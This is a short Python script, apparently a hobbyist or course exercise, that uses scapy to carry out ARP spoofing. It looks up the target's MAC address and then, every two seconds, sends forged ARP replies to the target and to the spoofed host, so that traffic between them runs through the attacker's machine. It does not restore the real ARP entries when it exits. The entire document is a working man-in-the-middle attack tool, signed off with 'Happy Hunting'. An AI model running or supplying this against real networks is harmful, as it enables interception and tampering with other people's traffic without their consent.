#!/usr/bin/env python

import scapy.all as scapy
import time
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", "-t", dest="target", help=" Target IP Address")
    parser.add_argument("--spoof", "-s", dest="spoof", help=" Spoofed IP")
    options = parser.parse_args()
    if not options.target:
        parser.error("[-] Please Specify the Target IP, Use --help for more info")
    elif not options.spoof:
        parser.error("[-] Please Specify the Spoofed IP, Use --help for more info")
    return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_broadcast, timeout=2, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoofed_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoofed_ip)
    scapy.send(packet, verbose=False)


options = get_arguments()
target = options.target
spoofed = options.spoof

packets_counter = 0

print("\nHappy Hunting :)\n")

try:
    while True:
        spoof(target, spoofed)
        spoof(spoofed, target)
        packets_counter = packets_counter + 1
        print("\r [+] Spoofed Packets Sent To " + str(target) + " are: " + str(packets_counter) + " \t[+] Spoofed Packets Sent To " + str(spoofed) + " are: " + str(packets_counter), end="")
        time.sleep(2)

except KeyboardInterrupt:
    print("\n\n [-] CTRL + C is Detected ..... Quiting.\n")
